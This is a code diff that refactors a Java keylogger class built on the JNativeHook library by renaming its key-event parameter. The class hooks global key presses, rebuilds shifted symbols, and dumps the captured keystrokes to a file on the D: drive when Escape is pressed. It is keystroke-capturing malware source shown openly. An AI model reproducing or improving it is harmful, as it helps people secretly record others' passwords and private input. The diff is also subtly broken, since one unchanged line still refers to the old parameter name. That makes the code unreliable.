@@ -20,11 +20,11 @@ public class keylogger implements NativeKeyListener{
     boolean st;
 
     @Override
-    public void nativeKeyPressed(NativeKeyEvent e) {
+    public void nativeKeyPressed(NativeKeyEvent evt) {
         // System.out.println("Key Pressed: " +
         // NativeKeyEvent.getKeyText(e.getKeyCode()));
 
-        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
             st = true;
         }
         
@@ -32,72 +32,72 @@ public class keylogger implements NativeKeyListener{
             s = s + NativeKeyEvent.getKeyText(e.getKeyCode());
         }
 
-        if (e.getKeyCode() == NativeKeyEvent.VC_1 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_1 && st) {
 
             s = s + "!";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_2 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_2 && st) {
 
             s = s + "@";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_3 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_3 && st) {
 
             s = s + "#";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_4 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_4 && st) {
 
             s = s + "$";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_5 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_5 && st) {
 
             s = s + "%";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_6 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_6 && st) {
 
             s = s + "^";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_7 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_7 && st) {
 
             s = s + "&";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_8 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_8 && st) {
 
             s = s + "*";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_9 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_9 && st) {
 
             s = s + "(";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_0 && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_0 && st) {
 
             s = s + ")";
 
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_SPACE && st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_SPACE && st) {
 
             s = s + " ";
         }
 
-        if (e.getKeyCode() == NativeKeyEvent.VC_EQUALS&& st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_EQUALS&& st) {
 
             s = s + "+";
         }
-        if (e.getKeyCode() == NativeKeyEvent.VC_UNDERSCORE&& st) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_UNDERSCORE&& st) {
 
             s = s + "_";
         }
       
 
-        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+        if (evt.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {
                 File f = new File("D:\\keys.txt");
                 try (FileWriter fw = new FileWriter(f)) {
@@ -112,18 +112,18 @@ public class keylogger implements NativeKeyListener{
 
 
     @Override
-    public void nativeKeyReleased(NativeKeyEvent e) {
+    public void nativeKeyReleased(NativeKeyEvent evt) {
          System.out.println("Key Released: " +
-         NativeKeyEvent.getKeyText(e.getKeyCode()));
-        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+         NativeKeyEvent.getKeyText(evt.getKeyCode()));
+        if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
             st = false;
         }
     }
 
 
     @Override
-    public void nativeKeyTyped(NativeKeyEvent e) {
-         System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+    public void nativeKeyTyped(NativeKeyEvent evt) {
+         System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(evt.getKeyCode()));
     }
 
 //    public static void main(String[] args) throws Exception {
